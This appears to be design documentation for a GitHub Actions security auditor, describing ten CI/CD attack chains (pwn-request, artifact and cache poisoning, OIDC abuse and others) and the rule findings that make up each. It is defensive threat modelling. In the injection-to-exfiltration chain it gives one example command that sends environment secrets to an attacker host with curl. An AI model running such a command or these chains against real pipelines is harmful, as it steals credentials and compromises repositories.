# Attack Chains and Threat Models

Isolated security misconfigurations often present moderate risk individually, but when combined within a workflow or repository lifecycle, create high-impact exploitation pathways. The auditor correlates findings into five canonical attack chains.

## 1. Pwn-Request (`pwn-request`)
- **Trigger**: `pull_request_target`
- **Component Findings**:
  - `R003`: Checking out untrusted PR head commit (`ref: ${{ github.event.pull_request.head.sha }}`)
  - `R002`: Excessive permissions (or default write-all token)
  - `R004` or build step execution (e.g. `npm run build`, `make`)
- **Impact**: Full repository compromise. An external attacker submits a malicious PR; the workflow executes attacker-controlled code inside the context of the base repository with write tokens and access to secrets.

## 2. Injection to Exfiltration (`injection-to-exfil`)
- **Component Findings**:
  - `R004`: Script injection via untrusted event payloads (`issue.title`, `commit.message`)
  - `R002` or accessible secrets (`env:` or repository secrets)
- **Impact**: Attacker-controlled issue/PR title injects shell commands (e.g. `curl attacker.com?data=$(env)`) exfiltrating workflow secrets and GITHUB_TOKEN.

## 3. Supply-Chain Takeover (`supply-chain-takeover`)
- **Component Findings**:
  - `R001`: Unpinned action ref (using mutable `@v1` tag)
  - `R010`: Third-party unvetted action
  - `R002`: Broad permissions granted to the job
- **Impact**: An attacker compromises the third-party action publisher or updates the git tag, executing malicious payloads inside victim CI/CD pipelines to tamper with artifacts.

## 4. Deploy Blast Radius (`deploy-blast-radius`)
- **Component Findings**:
  - `R008`: Deployment job lacking environment protection / gates
  - `R007`: Long-lived static cloud credentials
- **Impact**: Code changes directly trigger production deployments without manual review, using static credentials that lack audit trails and short-term expiration.

## 5. Runner Persistence (`runner-persistence`)
- **Component Findings**:
  - `R009`: Persistent `self-hosted` runner
  - Untrusted PR or issue trigger
- **Impact**: An attacker runs malicious commands on a shared, persistent host. The attacker installs a persistent backdoor, access tokens, or performs lateral network movement into internal infrastructure.

---

# Extension Attack Chains (Phase 2B / Phase 3 Specification)

The following 5 composite attack chains expand coverage across multi-stage CI/CD threats:

## 6. Artifact Poisoning (`artifact-poisoning`)
- **Required Findings**: `workflow-run-untrusted-artifact` + (`R002` / write permissions OR secrets in scope).
- **Scope**: Same workflow / job.
- **Narrative**: A privileged workflow triggered by `workflow_run` downloads an unverified build artifact produced by an untrusted fork's pull request. The privileged workflow executes or extracts this artifact in a context that holds write permissions or deployment secrets, allowing the untrusted contributor to escalate privileges and exfiltrate credentials.

## 7. Comment Trigger Takeover (`comment-trigger-takeover`)
- **Required Findings**: `comment-trigger-no-auth` + (`R004` / `script-injection` OR write permissions / secrets in scope).
- **Scope**: Same job.
- **Narrative**: An `issue_comment` or `pull_request_review_comment` workflow executes privileged logic or command lines based on comment text without verifying whether the commenter has write/admin privileges (`author_association` check). An unauthenticated external user comments on a public issue or PR to trigger unauthorized builds or inject commands.

## 8. Credential Persistence (`credential-persistence`)
- **Required Findings**: `persist-credentials` + (`R010` / unpinned third-party action OR `artifact-leak`).
- **Scope**: Same job.
- **Narrative**: `actions/checkout` executes without setting `persist-credentials: false`, storing the repository's temporary `GITHUB_TOKEN` in `.git/config`. Subsequent steps run an unpinned third-party action or upload the workspace as an artifact, exposing the token to untrusted action authors or external artifact downloaders.

## 9. Cache Poisoning Escalation (`cache-poisoning-escalation`)
- **Required Findings**: `cache-poisoning-risk` + (`R008` / deploy job OR secrets in scope).
- **Scope**: Same workflow or shared cache key namespace.
- **Narrative**: A dependency cache (e.g. `actions/cache` or `setup-node` caching) is utilized in a privileged release or deployment workflow where cache keys can be influenced or seeded by non-protected branches or PRs. The poisoned cache injects malicious build-time dependencies into production release binaries.

## 10. OIDC Abuse (`oidc-abuse`)
- **Required Findings**: `oidc-write-untrusted` + (`R001` / unpinned action OR `R008` / deploy job).
- **Scope**: Same job.
- **Narrative**: A workflow requests cloud identity federation tokens (`id-token: write`) but uses unpinned third-party actions or executes on untrusted triggers. Malicious or compromised actions intercept the OIDC token exchange to authenticate directly against the organization's AWS, GCP, or Azure cloud environments.


